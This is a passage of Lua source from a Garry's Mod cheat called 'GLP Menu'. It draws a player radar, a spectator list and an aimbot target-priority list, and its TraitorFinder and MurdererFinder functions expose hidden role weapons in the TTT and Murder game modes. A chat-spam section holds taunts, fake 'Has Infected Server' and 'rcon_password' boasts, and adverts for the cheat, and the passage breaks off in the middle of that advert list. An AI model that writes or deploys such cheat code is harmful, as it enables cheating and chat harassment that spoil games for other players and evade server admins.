	draw.RoundedBox(gInt("Home", "List Positions", "Roundness:"), gInt("Home", "List Positions", "Custom Status X:") + 1, gInt("Home", "List Positions", "Custom Status Y:") - 23, 88, 20, Color(gInt("Home", "Background Menu Color", "Red:"), gInt("Home", "Background Menu Color", "Green:"), gInt("Home", "Background Menu Color", "Blue:"), gInt("Home", "Others", "BG Opacity:")))
	draw.DrawText("Details", "MiscFont2", gInt("Home", "List Positions", "Custom Status X:") + 45, gInt("Home", "List Positions", "Custom Status Y:") - 22, Color(gInt("Home", "Main Text Color", "Red:"), gInt("Home", "Main Text Color", "Green:"), gInt("Home", "Main Text Color", "Blue:"), gInt("Home", "Others", "T Opacity:")), TEXT_ALIGN_CENTER)
end

local function Status()
	local hh = - 10
	local wep = pm.GetActiveWeapon(me)
	local hp = em.Health(me)
	local velocity = me:GetVelocity():Length()
	if hp < 0 then
		hp = 0
	end
	surface.SetFont("MiscFont")
	hh = hh + 12
	surface.SetTextPos(gInt("Home", "List Positions", "Custom Status X:") + 3, hh + gInt("Home", "List Positions", "Custom Status Y:"))
	surface.SetTextColor(239, 185, 0, 255, gInt("Home", "Others", "T Opacity:"))
	surface.DrawText("Current Health: "..hp)
	if(em.IsValid(wep)) then
	local daclip = wep:Clip1()
		if daclip < 0 then
			daclip = 0
		end
		surface.SetTextColor(239, 185, 0, 255, gInt("Home", "Others", "T Opacity:"))
		hh = hh + 12
		surface.SetTextPos(gInt("Home", "List Positions", "Custom Status X:") + 3, hh + gInt("Home", "List Positions", "Custom Status Y:"))
		surface.DrawText("Current Ammo: "..daclip.."/"..me:GetAmmoCount(wep:GetPrimaryAmmoType()))
	else
		surface.SetTextColor(0, 131, 125, gInt("Home", "Others", "T Opacity:"))
		hh = hh + 12
		surface.SetTextPos(gInt("Home", "List Positions", "Custom Status X:") + 3, hh + gInt("Home", "List Positions", "Custom Status Y:"))
		surface.DrawText("Current Ammo: ".."0".."/".."0")
	end
	hh = hh + 12
	surface.SetTextPos(gInt("Home", "List Positions", "Custom Status X:") + 3, hh + gInt("Home", "List Positions", "Custom Status Y:"))
	surface.SetTextColor(137, 239, 0, 255, gInt("Home", "Others", "T Opacity:"))
	surface.DrawText("CharacterSpeed: "..math.Round(velocity))
	hh = hh + 12
	surface.SetTextPos(gInt("Home", "List Positions", "Custom Status X:") + 3, hh + gInt("Home", "List Positions", "Custom Status Y:"))
	surface.SetTextColor(46, 196, 193, 255, gInt("Home", "Others", "T Opacity:"))
	surface.DrawText("Server: "..GetHostName())
	hh = hh + 12
	surface.SetTextPos(gInt("Home", "List Positions", "Custom Status X:") + 3, hh + gInt("Home", "List Positions", "Custom Status Y:"))
	surface.SetTextColor(46, 196, 193, 255, gInt("Home", "Others", "T Opacity:"))
	surface.DrawText("Gamemode: "..engine.ActiveGamemode())
	hh = hh + 12
	surface.SetTextPos(gInt("Home", "List Positions", "Custom Status X:") + 3, hh + gInt("Home", "List Positions", "Custom Status Y:"))
	surface.SetTextColor(46, 196, 193, 255, gInt("Home", "Others", "T Opacity:"))
	surface.DrawText("Map: "..game.GetMap())
	hh = hh + 12
	surface.SetTextPos(gInt("Home", "List Positions", "Custom Status X:") + 3, hh + gInt("Home", "List Positions", "Custom Status Y:"))
	surface.SetTextColor(255, 135, 0, 255, gInt("Home", "Others", "T Opacity:"))
	surface.DrawText("Looking at: "..EntityName())
	hh = hh + 12
	surface.SetTextPos(gInt("Home", "List Positions", "Custom Status X:") + 3, hh + gInt("Home", "List Positions", "Custom Status Y:"))
	surface.SetTextColor(255, 0, 0, 255, gInt("Home", "Others", "T Opacity:"))
	surface.DrawText("ServerWideEntities: "..math.Round(ents.GetCount() - player.GetCount()*12))
	hh = hh + 12
	surface.SetTextPos(gInt("Home", "List Positions", "Custom Status X:") + 3, hh + gInt("Home", "List Positions", "Custom Status Y:"))
	surface.SetTextColor(103, 156, 193, 255, gInt("Home", "Others", "T Opacity:"))
	surface.DrawText("Frames: "..math.Round(1/FrameTime()))
	hh = hh + 12
	surface.SetTextPos(gInt("Home", "List Positions", "Custom Status X:") + 3, hh + gInt("Home", "List Positions", "Custom Status Y:"))
	surface.SetTextColor(103, 156, 193, 255, gInt("Home", "Others", "T Opacity:"))
	surface.DrawText("Ping: "..me:Ping())
	hh = hh + 12
	surface.SetTextPos(gInt("Home", "List Positions", "Custom Status X:") + 3, hh + gInt("Home", "List Positions", "Custom Status Y:"))
	surface.SetTextColor(103, 156, 193, 255, gInt("Home", "Others", "T Opacity:"))
	surface.DrawText("Date: "..os.date("%d %b %Y"))
	hh = hh + 12
	surface.SetTextPos(gInt("Home", "List Positions", "Custom Status X:") + 3, hh + gInt("Home", "List Positions", "Custom Status Y:"))
	surface.SetTextColor(103, 156, 193, 255, gInt("Home", "Others", "T Opacity:"))
	surface.DrawText("Time: "..os.date("%H:%M:%S"))
end

local function Spectator()
	local radarX, radarY, radarWidth, radarHeight = 50, ScrH() / 3, 200, 200
	local color1 = (Color(0, 0, 0, gInt("Home", "Others", "BG Opacity:")))
	local color2 = (Color(255, 0, 0, gInt("Home", "Others", "T Opacity:")))
	local color3 = (Color(gInt("Home", "Main Text Color", "Red:"), gInt("Home", "Main Text Color", "Green:"), gInt("Home", "Main Text Color", "Blue:"), gInt("Home", "Others", "T Opacity:")))
	local color4 = (Color(0, 131, 125, gInt("Home", "Others", "T Opacity:")))
	local hudspecslength = 150
	specscount = 0
	draw.RoundedBox(gInt("Home", "Window Positions", "Roundness:"), gInt("Home", "Window Positions", "Spectators X:") + 2, gInt("Home", "Window Positions", "Spectators Y:"), radarWidth, radarHeight, Color(gInt("Home", "Background Menu Color", "Red:"), gInt("Home", "Background Menu Color", "Green:"), gInt("Home", "Background Menu Color", "Blue:"), gInt("Home", "Others", "BG Opacity:")))
	draw.SimpleText("Spectators", "MiscFont2", gInt("Home", "Window Positions", "Spectators X:") + 102, gInt("Home", "Window Positions", "Spectators Y:") + 11, color3, 1, 1)
	for k, v in pairs(player.GetAll()) do
		if (IsValid(v:GetObserverTarget())) and v:GetObserverTarget() == me then
			DrawOutlinedText (v:GetName(), "MiscFont2", gInt("Home", "Window Positions", "Spectators X:") + 102, gInt("Home", "Window Positions", "Spectators Y:") + 32 + specscount, color2, 0.1, color1)
			specscount = specscount + 12
		end
	end
	if specscount == 0 then
		DrawOutlinedText ("none", "MiscFont2", gInt("Home", "Window Positions", "Spectators X:") + 102, gInt("Home", "Window Positions", "Spectators Y:") + 32, color4, 0.1, color1)
	end
	hudspecslength = specscount + 19
end

local function DrawArrow(x, y, myRotation)
	local arrow = {}
	arrow[1] = {x = x, y = y}
	arrow[2] = {x = x + 4, y = y + 7.5}
	arrow[3] = {x = x, y = y + 5}
	arrow[4] = {x = x - 4, y = y + 7.5}
	myRotation = myRotation * - 1
	myRotation = math.rad(myRotation)
	for i = 1, 4 do
		local theirX = arrow[i].x
		local theirY = arrow[i].y
		theirX = theirX - x
		theirY = theirY - y
		arrow[i].x = theirX * math.cos(myRotation) - theirY * math.sin(myRotation)
		arrow[i].y = theirX * math.sin(myRotation) + theirY * math.cos(myRotation)
		arrow[i].x = arrow[i].x + x
		arrow[i].y = arrow[i].y + y
	end
	surface.DrawPoly(arrow)
end

local radarX, radarY, radarWidth, radarHeight = 50, ScrH() / 3, 200, 200

local function RadarDraw()
	local col = Color(gInt("Home", "Main Text Color", "Red:"), gInt("Home", "Main Text Color", "Green:"), gInt("Home", "Main Text Color", "Blue:"), gInt("Home", "Others", "T Opacity:"))
	local everything = ents.GetAll()
	draw.RoundedBox(gInt("Home", "Window Positions", "Roundness:"), gInt("Home", "Window Positions", "Radar X:") + 2, gInt("Home", "Window Positions", "Radar Y:"), radarWidth, radarHeight, Color(gInt("Home", "Background Menu Color", "Red:"), gInt("Home", "Background Menu Color", "Green:"), gInt("Home", "Background Menu Color", "Blue:"), gInt("Home", "Others", "BG Opacity:")))
	draw.SimpleText("Radar", "MiscFont2", gInt("Home", "Window Positions", "Radar X:") + 102, gInt("Home", "Window Positions", "Radar Y:") + 11, col, 1, 1)
	draw.NoTexture()
	surface.SetDrawColor(team.GetColor(me:Team()))
	for k = 1, #everything do
		local v = everything[k]
		if (v:IsPlayer() and v:Health() > 0 and v:Team() ~= TEAM_SPECTATOR or (v:IsNPC() and v:Health() > 0)) then
			color = v:IsPlayer() and team.GetColor(v:Team()) or Color(255, 255, 255)
			surface.SetDrawColor(color)
			local myPos = me:GetPos()
			local theirPos = v:GetPos()
			local theirX = (radarX + (radarWidth / 2)) + ((theirPos.x - myPos.x) / gInt("ESP", "Extra", "Radar Distance:"))
			local theirY = (radarY + (radarHeight / 2)) + ((myPos.y - theirPos.y) / gInt("ESP", "Extra", "Radar Distance:"))
			local myRotation = math.rad(fa.y - 90)
			theirX = theirX - (radarX + (radarWidth / 2))
			theirY = theirY - (radarY + (radarHeight / 2))
			local newX = theirX * math.cos(myRotation) - theirY * math.sin(myRotation)
			local newY = theirX * math.sin(myRotation) + theirY * math.cos(myRotation)
			newX = newX + (gInt("Home", "Window Positions", "Radar X:") + 2 + (radarWidth / 2))
			newY = newY + (gInt("Home", "Window Positions", "Radar Y:") + 2 + (radarHeight / 2))
			if newX < (gInt("Home", "Window Positions", "Radar X:") + 2 + radarWidth) and newX > gInt("Home", "Window Positions", "Radar X:") + 2 and newY < (gInt("Home", "Window Positions", "Radar Y:") + radarHeight) and newY > gInt("Home", "Window Positions", "Radar Y:") then
				DrawArrow(newX + 4, newY, v:EyeAngles().y - fa.y)
			end
		end
	end
end

local function Logo2()
	draw.RoundedBox(gInt("Home", "List Positions", "Roundness:"), gInt("Home", "List Positions", "Players List X:") + 1, gInt("Home", "List Positions", "Players List Y:") - 23, 88, 20, Color(gInt("Home", "Background Menu Color", "Red:"), gInt("Home", "Background Menu Color", "Green:"), gInt("Home", "Background Menu Color", "Blue:"), gInt("Home", "Others", "BG Opacity:")))
	draw.DrawText("Players", "MiscFont2", gInt("Home", "List Positions", "Players List X:") + 47, gInt("Home", "List Positions", "Players List Y:") - 22, Color(gInt("Home", "Main Text Color", "Red:"), gInt("Home", "Main Text Color", "Green:"), gInt("Home", "Main Text Color", "Blue:"), gInt("Home", "Others", "T Opacity:")), TEXT_ALIGN_CENTER)
end

local function Players()
	local hh = - 10
	surface.SetFont("MiscFont")
	hh = hh + 12
surface.SetTextPos(gInt("Home", "List Positions", "Players List X:") + 3, hh + gInt("Home", "List Positions", "Players List Y:"))
	surface.SetTextColor(0, 131, 175, gInt("Home", "Others", "T Opacity:"))
	surface.DrawText("Players: "..player.GetCount().."/"..game.MaxPlayers())
	local NWString = em.GetNWString(v)
	for k, v in next, player.GetAll() do
		surface.SetTextColor(0, 131, 175, gInt("Home", "Others", "T Opacity:"))
		hh = hh + 12
		surface.SetTextPos(gInt("Home", "List Positions", "Players List X:") + 3, hh + gInt("Home", "List Positions", "Players List Y:"))
		surface.DrawText("" .. em.GetNWString(v, "usergroup").."")
		surface.SetTextColor(255, 255, 255, gInt("Home", "Others", "T Opacity:"))
		surface.DrawText(" " .. v:GetName())
	end
end

local pressed = false

local function Prioritize(v)
	if table.HasValue(ignore_list, v:UniqueID()) then
		table.RemoveByValue(ignore_list, v:UniqueID())
	elseif table.HasValue(priority_list, v:UniqueID()) then
		table.RemoveByValue(priority_list, v:UniqueID())
	else
		table.insert(priority_list, v:UniqueID())
	end
	file.Write(folder.."/priority.txt", util.TableToJSON(priority_list))
	file.Write(folder.."/ignored.txt", util.TableToJSON(ignore_list))
end

local function Ignore(v)
	if table.HasValue(priority_list, v:UniqueID()) then
		table.RemoveByValue(priority_list, v:UniqueID())
	elseif table.HasValue(ignore_list, v:UniqueID()) then
		table.RemoveByValue(ignore_list, v:UniqueID())
	else
		table.insert(ignore_list, v:UniqueID())
	end
	file.Write(folder.."/priority.txt", util.TableToJSON(priority_list))
	file.Write(folder.."/ignored.txt", util.TableToJSON(ignore_list))
end

local function Priority(v)
	if table.HasValue(priority_list, v:UniqueID()) then
		return "Priority Target"
	elseif table.HasValue(ignore_list, v:UniqueID()) then
		return "Ignored Target"
	else
		return "Normal"
	end
end

local function PlayerList()
	local pos_x, pos_y = ScrW()/1.26, ScrH()/5.5
	local number = 1
	local offset = 14 + gInt("Aimbot", "Aim Options", "List Spacing:")
	surface.SetDrawColor(gInt("Home", "Main Text Color", "Red:"), gInt("Home", "Main Text Color", "Green:"), gInt("Home", "Main Text Color", "Blue:"), 100)
	surface.DrawRect(pos_x, pos_y, 350, 15)
	surface.SetDrawColor(0, 0, 0)
	surface.DrawOutlinedRect(pos_x, pos_y, 350, 15)
	surface.DrawOutlinedRect(pos_x, pos_y, 30, 15)
	surface.DrawOutlinedRect(pos_x + 29, pos_y, 180, 15)
	draw.SimpleText("#", "MiscFont", pos_x + 5, pos_y, Color(255, 255, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT)
	draw.SimpleText("Username", "MiscFont", pos_x + 35, pos_y, Color(255, 255, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT)
	draw.SimpleText("Priority Level", "MiscFont", pos_x + 214, pos_y, Color(255, 255, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT)
	for k, v in next, player.GetAll() do
		if v == me or not v:IsValid() then continue end
		if MouseInArea(pos_x, pos_y + offset, pos_x + 350, pos_y + offset + 14) then
			if input.IsMouseDown(107) then
				if MouseInArea(pos_x + 30, pos_y + offset, pos_x + 209, pos_y + offset + 14) and not v:IsBot() then
					gui.OpenURL("http://steamcommunity.com/profiles/"..v:SteamID64().."/")
				elseif MouseInArea(pos_x + 209, pos_y + offset, pos_x + 350, pos_y + offset + 14) and not pressed then
					Prioritize(v)
					pressed = true
				end
			elseif input.IsMouseDown(108) then
				if MouseInArea(pos_x + 30, pos_y + offset, pos_x + 209, pos_y + offset + 14) and not v:IsBot() then
					SetClipboardText("http://steamcommunity.com/profiles/"..v:SteamID64().."/")
				elseif MouseInArea(pos_x + 209, pos_y + offset, pos_x + 350, pos_y + offset + 14) and not pressed then
					Ignore(v)
					pressed = true
				end
			else
				pressed = false
			end
				if table.HasValue(ignore_list, v:UniqueID()) then
					surface.SetDrawColor(175, 175, 175)
				elseif table.HasValue(priority_list, v:UniqueID()) then
					surface.SetDrawColor(255, 0, 100)
				else
					surface.SetDrawColor(gInt("Home", "Background Menu Color", "Red:"), gInt("Home", "Background Menu Color", "Green:"), gInt("Home", "Background Menu Color", "Blue:"))
				end
			else
				if table.HasValue(ignore_list, v:UniqueID()) then
					surface.SetDrawColor(175, 175, 175)
				elseif table.HasValue(priority_list, v:UniqueID()) then
					surface.SetDrawColor(255, 0, 100)
				else
					surface.SetDrawColor(gInt("Home", "Background Menu Color", "Red:"), gInt("Home", "Background Menu Color", "Green:"), gInt("Home", "Background Menu Color", "Blue:"), 235)
				end
			end
		surface.DrawRect(pos_x, pos_y + offset, 350, 15)
		surface.SetDrawColor(0, 0, 0)
		surface.DrawOutlinedRect(pos_x, pos_y + offset, 350, 15)
		surface.DrawOutlinedRect(pos_x, pos_y + offset, 30, 15)
		surface.DrawOutlinedRect(pos_x + 29, pos_y + offset, 180, 15)
		draw.SimpleText(number, "MiscFont", pos_x + 5, pos_y + offset, Color(255, 255, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT)
		draw.SimpleText(v:Nick(), "MiscFont", pos_x + 35, pos_y + offset, Color(255, 255, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT)
		draw.SimpleText(Priority(v), "MiscFont", pos_x + 214, pos_y + offset, Color(255, 255, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT)
		offset = offset + 14 + gInt("Aimbot", "Aim Options", "List Spacing:")
		number = number + 1
	end
end

local function Crosshair()
	if menuopen then return end
	if me:Team() == TEAM_SPECTATOR then return end
	if not me:Alive() or me:Health() < 1 then return end
	if(gInt("Extra", "Extra", "Crosshair Type:") == "Square") then
	local x1, y1 = ScrW() * 0.5, ScrH() * 0.5
		surface.SetDrawColor(0, 0, 0)
		surface.DrawOutlinedRect(x1 - 3, y1 - 2, 6, 6)
		surface.SetDrawColor(gInt("Home", "Crosshair Color", "Red:"), gInt("Home", "Crosshair Color", "Green:"), gInt("Home", "Crosshair Color", "Blue:"), gInt("Home", "Others", "T Opacity:"))
		surface.DrawRect(x1 - 2, y1 - 1, 4, 4)
	end
		if(gInt("Extra", "Extra", "Crosshair Type:") == "Cross") then
		surface.SetDrawColor(gInt("Home", "Crosshair Color", "Red:"), gInt("Home", "Crosshair Color", "Green:"), gInt("Home", "Crosshair Color", "Blue:"), gInt("Home", "Others", "T Opacity:"))
		surface.DrawLine(ScrW() / 2 - 11, ScrH() / 2, ScrW() / 2 + 11 , ScrH() / 2)
		surface.DrawLine(ScrW() / 2 - 0, ScrH() / 2 - 11, ScrW() / 2 - 0 , ScrH() / 2 + 11)
	end
		if(gInt("Extra", "Extra", "Crosshair Type:") == "Aimware") then
		surface.SetDrawColor(gInt("Home", "Crosshair Color", "Red:"), gInt("Home", "Crosshair Color", "Green:"), gInt("Home", "Crosshair Color", "Blue:"), gInt("Home", "Others", "T Opacity:"))
		surface.DrawLine(ScrW() / 2 - 14.5, ScrH() / 2, ScrW() / 2 + 14.5 , ScrH() / 2)
		surface.DrawLine(ScrW() / 2 - 0, ScrH() / 2 - 14.5, ScrW() / 2 - 0 , ScrH() / 2 + 14.5)
		surface.SetDrawColor(255, 255, 255)
		surface.DrawLine(ScrW() / 2 - 9, ScrH() / 2, ScrW() / 2 + 9 , ScrH() / 2)
		surface.DrawLine(ScrW() / 2 - 0, ScrH() / 2 - 9, ScrW() / 2 - 0 , ScrH() / 2 + 9)
        end
		if(gInt("Extra", "Extra", "Crosshair Type:") == "Box") then
		local x1, y1 = ScrW() * 0.5, ScrH() * 0.5
		surface.SetDrawColor(gInt("Home", "Crosshair Color", "Red:"), gInt("Home", "Crosshair Color", "Green:"), gInt("Home", "Crosshair Color", "Blue:"), gInt("Home", "Others", "T Opacity:"))
		surface.DrawOutlinedRect(x1 - 3, y1 - 2, 6, 6)
	end
		if(gInt("Extra", "Extra", "Crosshair Type:") == "Circle") then
		surface.DrawCircle(ScrW()/2, ScrH()/2, 4, Color(gInt("Home", "Crosshair Color", "Red:"), gInt("Home", "Crosshair Color", "Green:"), gInt("Home", "Crosshair Color", "Blue:"), gInt("Home", "Others", "T Opacity:")))
	end
		if(gInt("Extra", "Extra", "Crosshair Type:") == "Dot") then
		surface.DrawCircle(ScrW()/2, ScrH()/2, 1.4, Color(gInt("Home", "Crosshair Color", "Red:"), gInt("Home", "Crosshair Color", "Green:"), gInt("Home", "Crosshair Color", "Blue:"), gInt("Home", "Others", "T Opacity:")))
        end
		if(gInt("Extra", "Extra", "Crosshair Type:") == "GTA IV") then
		surface.DrawCircle(ScrW()/2, ScrH()/2, 11, Color(gInt("Home", "Crosshair Color", "Red:"), gInt("Home", "Crosshair Color", "Green:"), gInt("Home", "Crosshair Color", "Blue:"), gInt("Home", "Others", "T Opacity:")))
		surface.DrawCircle(ScrW()/2, ScrH()/2, 1.4, Color(gInt("Home", "Crosshair Color", "Red:"), gInt("Home", "Crosshair Color", "Green:"), gInt("Home", "Crosshair Color", "Blue:"), gInt("Home", "Others", "T Opacity:")))
	end
		if(gInt("Extra", "Extra", "Crosshair Type:") == "fovcircle") then
		surface.DrawCircle(ScrW()/2, ScrH()/2, 630, Color(gInt("Home", "Crosshair Color", "Red:"), gInt("Home", "Crosshair Color", "Green:"), gInt("Home", "Crosshair Color", "Blue:"), gInt("Home", "Others", "T Opacity:")))
		surface.DrawCircle(ScrW()/2, ScrH()/2, 1.5, Color(gInt("Home", "Crosshair Color", "Red:"), gInt("Home", "Crosshair Color", "Green:"), gInt("Home", "Crosshair Color", "Blue:"), gInt("Home", "Others", "T Opacity:")))
	end
end

local hide = {
	CHudHealth = true, 
	CHudAmmo = true, 
	CHudBattery = true, 
	CHudSecondaryAmmo = true, 
	CHudDamageIndicator = true, 
	CHudCrosshair = true, 
}

hook.Add("HUDShouldDraw", "Hook4", function(name)
	if (gConn("Extra", "Extra", "Hide HUD")) and (hide[name]) then
		return false
	end
end)
	
local function TraitorFinder()
	for k, v in pairs(ents.FindByClass("weapon_ttt_c4")) do
	local pos = em.GetPos(v) + Vector(1, 0, - 6)
	local pos2 = pos + Vector(0, 0, 70)
	local pos = vm.ToScreen(pos)
	local pos2 = vm.ToScreen(pos2)
	local h = pos.y - pos2.y
	local w = h / 1.3
	local h = h/ 1.8
	local Ent = v
	local Dist = math.floor(Ent:GetPos():Distance(me:GetShootPos())/40)
	draw.DrawText("Traitor C4", "MiscFont", pos.x + w/50, pos.y + h /11, Color(255, 0, 100), 1)
	end
	for k, v in pairs(ents.FindByClass("weapon_ttt_knife")) do
	local pos = em.GetPos(v) + Vector(1, 0, - 6)
	local pos2 = pos + Vector(0, 0, 70)
	local pos = vm.ToScreen(pos)
	local pos2 = vm.ToScreen(pos2)
	local h = pos.y - pos2.y
	local w = h / 1.3
	local h = h/ 1.8
	local Ent = v
	local Dist = math.floor(Ent:GetPos():Distance(me:GetShootPos())/40)
	draw.DrawText("Traitor Knife", "MiscFont", pos.x + w/50, pos.y + h /11, Color(255, 0, 100), 1)
	end
	for k, v in pairs(ents.FindByClass("weapon_ttt_phammer")) do
	local pos = em.GetPos(v) + Vector(1, 0, - 6)
	local pos2 = pos + Vector(0, 0, 70)
	local pos = vm.ToScreen(pos)
	local pos2 = vm.ToScreen(pos2)
	local h = pos.y - pos2.y
	local w = h / 1.3
	local h = h/ 1.8
	local Ent = v
	local Dist = math.floor(Ent:GetPos():Distance(me:GetShootPos())/40)
	draw.DrawText("Traitor Poltergeist", "MiscFont", pos.x + w/50, pos.y + h /11, Color(255, 0, 100), 1)
	end
	for k, v in pairs(ents.FindByClass("weapon_ttt_sipistol")) do
	local pos = em.GetPos(v) + Vector(1, 0, - 6)
	local pos2 = pos + Vector(0, 0, 70)
	local pos = vm.ToScreen(pos)
	local pos2 = vm.ToScreen(pos2)
	local h = pos.y - pos2.y
	local w = h / 1.3
	local h = h/ 1.8
	local Ent = v
	local Dist = math.floor(Ent:GetPos():Distance(me:GetShootPos())/40)
	draw.DrawText("Traitor Silenced Pistol", "MiscFont", pos.x + w/50, pos.y + h /11, Color(255, 0, 100), 1)
	end
	for k, v in pairs(ents.FindByClass("weapon_ttt_pain_station")) do
	local pos = em.GetPos(v) + Vector(1, 0, - 6)
	local pos2 = pos + Vector(0, 0, 70)
	local pos = vm.ToScreen(pos)
	local pos2 = vm.ToScreen(pos2)
	local h = pos.y - pos2.y
	local w = h / 1.3
	local h = h/ 1.8
	local Ent = v
	local Dist = math.floor(Ent:GetPos():Distance(me:GetShootPos())/40)
	draw.DrawText("Traitor Pain Station", "MiscFont", pos.x + w/50, pos.y + h /11, Color(255, 0, 100), 1)
	end
	for k, v in pairs(ents.FindByClass("weapon_ttt_flaregun")) do
	local pos = em.GetPos(v) + Vector(1, 0, - 6)
	local pos2 = pos + Vector(0, 0, 70)
	local pos = vm.ToScreen(pos)
	local pos2 = vm.ToScreen(pos2)
	local h = pos.y - pos2.y
	local w = h / 1.3
	local h = h/ 1.8
	local Ent = v
	local Dist = math.floor(Ent:GetPos():Distance(me:GetShootPos())/40)
	draw.DrawText("Traitor Flaregun", "MiscFont", pos.x + w/50, pos.y + h /11, Color(255, 0, 100), 1)
	end
	for k, v in pairs(ents.FindByClass("weapon_ttt_push")) do
	local pos = em.GetPos(v) + Vector(1, 0, - 6)
	local pos2 = pos + Vector(0, 0, 70)
	local pos = vm.ToScreen(pos)
	local pos2 = vm.ToScreen(pos2)
	local h = pos.y - pos2.y
	local w = h / 1.3
	local h = h/ 1.8
	local Ent = v
	local Dist = math.floor(Ent:GetPos():Distance(me:GetShootPos())/40)
	draw.DrawText("Traitor Newton Launcher", "MiscFont", pos.x + w/50, pos.y + h /11, Color(255, 0, 100), 1)
	end
	for k, v in pairs(ents.FindByClass("weapon_ttt_radio")) do
	local pos = em.GetPos(v) + Vector(1, 0, - 6)
	local pos2 = pos + Vector(0, 0, 70)
	local pos = vm.ToScreen(pos)
	local pos2 = vm.ToScreen(pos2)
	local h = pos.y - pos2.y
	local w = h / 1.3
	local h = h/ 1.8
	local Ent = v
	local Dist = math.floor(Ent:GetPos():Distance(me:GetShootPos())/40)
	draw.DrawText("Traitor Radio", "MiscFont", pos.x + w/50, pos.y + h /11, Color(255, 0, 100), 1)
	end
	for k, v in pairs(ents.FindByClass("weapon_ttt_teleport")) do
	local pos = em.GetPos(v) + Vector(1, 0, - 6)
	local pos2 = pos + Vector(0, 0, 70)
	local pos = vm.ToScreen(pos)
	local pos2 = vm.ToScreen(pos2)
	local h = pos.y - pos2.y
	local w = h / 1.3
	local h = h/ 1.8
	local Ent = v
	local Dist = math.floor(Ent:GetPos():Distance(me:GetShootPos())/40)
	draw.DrawText("Traitor Teleport", "MiscFont", pos.x + w/50, pos.y + h /11, Color(255, 0, 100), 1)
	end
	for k, v in pairs(ents.FindByClass("(Disguise)")) do
	local pos = em.GetPos(v) + Vector(1, 0, - 6)
	local pos2 = pos + Vector(0, 0, 70)
	local pos = vm.ToScreen(pos)
	local pos2 = vm.ToScreen(pos2)
	local h = pos.y - pos2.y
	local w = h / 1.3
	local h = h/ 1.8
	local Ent = v
	local Dist = math.floor(Ent:GetPos():Distance(me:GetShootPos())/40)
	draw.DrawText("Traitor", "MiscFont", pos.x + w/50, pos.y + h /11, Color(255, 0, 100), 1)
	end
end

local function MurdererFinder()
	for k, v in pairs(ents.FindByClass("weapon_mu_knife")) do
	local pos = em.GetPos(v) + Vector(1, 0, - 6)
	local pos2 = pos + Vector(0, 0, 70)
	local pos = vm.ToScreen(pos)
	local pos2 = vm.ToScreen(pos2)
	local h = pos.y - pos2.y
	local w = h / 1.3
	local h = h/ 1.8
	local Ent = v
	local Dist = math.floor(Ent:GetPos():Distance(me:GetShootPos())/40)
	draw.DrawText("Murderer Knife", "MiscFont", pos.x + w/50, pos.y + h /11, Color(100, 0, 255), 1)
	end
	for k, v in pairs(ents.FindByClass("weapon_mu_magnum")) do
	local pos = em.GetPos(v) + Vector(1, 0, - 6)
	local pos2 = pos + Vector(0, 0, 70)
	local pos = vm.ToScreen(pos)
	local pos2 = vm.ToScreen(pos2)
	local h = pos.y - pos2.y
	local w = h / 1.3
	local h = h/ 1.8
	local Ent = v
	local Dist = math.floor(Ent:GetPos():Distance(me:GetShootPos())/40)
	draw.DrawText("Magnum Pistol", "MiscFont", pos.x + w/50, pos.y + h /11, Color(100, 0, 255), 1)
	end
end

local function ChatSpam()


local RUSSIan = { -- I love my Discord server for making this thing x2
	"ПОЛУЧИТЬ В СОБСТВЕННОСТЬ",
	"ПОЛУЧИТЬ ИЗБИЛИ РЕБЕНКА",
	"Ха почему бы не у получить хорошее",
	" Вы наняли 8yr старый, чтобы сделать это",
	"ПОЛУЧИТЬ В СОБСТВЕННОСТЬ",
	"Я МОГ БЫ ИГРАТЬ ОДНОЙ РУКОЙ",
	"Я МОГ БЫ ИГРАТЬ ОДНОЙ РУКОЙ",
	"Я МОГ БЫ ИГРАТЬ ОДНОЙ РУКОЙ",
	"ПРИНАДЛЕЖАВШИЙ МАЛЫШ",
	"ТЫ ВООБЩЕ ПЫТАЕШЬСЯ?",
	"ПОЛУЧИТЬ DESTROYYYED",
	"ПОЛУЧИТЬ DESTROYYYED",
}

local messagFakeAnglesam = {
	"[GLP]  Looks down on this Server - rcon_password",
	"[GLP]  Has Infected Server",
	"[GLP]  Looks down on this Server - rcon_password",
	"[GLP]  Looks down on this Server - rcon_password",
	"[GLP]  Looks down on this Server - rcon_password",
	"[GLP]  Has Infected Server",
	"[GLP]  Looks down on this Server - rcon_password",
	"[GLP]  Looks down on this Server - rcon_password",
	"[GLP] Looks down on this Server - rcon_password",
	"[GLP] Has Infected Server",
	"[GLP]  Looks down on this Server - rcon_password",
	"[GLP]  Has Infected Server",
	"[GLP]  Looks down on this Server - rcon_password",
	"[GLP]  Looks down on this Server - rcon_password",
	"[GLP]  Looks down on this Server - rcon_password",
	"[GLP]  Looks down on this Server - rcon_password",
	"[GLP]  Looks down on this Server - rcon_password",
	"[GLP]  Looks down on this Server - rcon_password",
	"[GLP]  Looks down on this Server - rcon_password",
	"[GLP] Looks down on this Server - rcon_password",
	"[GLP]  Has Infected Server",
	"[GLP]  Looks down on this Server - rcon_password",
}

local offensivFakeAnglesam = {
	"Ha Rekted",
	"You Stinky",
	"EZ",
	"EZ + EZ is STILL EZ",
	"You Play often i guess not?",
	"So...u got Owned",
	"Playing with only one Hand",
	"GET OWNED",
	"u ez",
	"got this Win",
	"EZ DUB",
}


local advertise = {
	"[GLP Menu] - GLP Menu Cheat is Great Cheat",
	"[GLP Menu] - Destroying everyone since '5.",
	"[GLP Menu] - Easy to use, free Garry's Mod cheat.",
	"[GLP Menu] - Now you can forget that negative KD's can be possible.",
	"[GLP Menu] - Beats all Admins :).",
	"[GLP Menu] - GLP Menu Download Today..OH WAIT u cant HA.",
	"[GLP Menu] - GLP Menu Reworked Cheat Brillaint...",
	"[GLP Menu] - The only high-quality free cheat, out for Garry's Mod.",
	"[GLP Menu] - ????",
	"[GLP Menu] - Always updated, never dead.",
	"[GLP Menu] - A highly reliable and optimised cheating software.",
	"[GLP Menu] - Top class, free cheat for Garry's Mod.",
	"[GLP Menu] - Makes noobs cry waves of tears since forever!",
	"[GLP Menu] - Say goodbye to the rFakeAnglesawn room!",
	"[GLP Menu] - Download the highest quality Garry's Mod cheat for free now!",
	"[GLP Menu] - A reliable way to go!",
	"[GLP Menu] - Ha Owned by Skelnton Key",
	"[GLP Menu] - Monthly bugfixes & updates. It never gets outdated!",
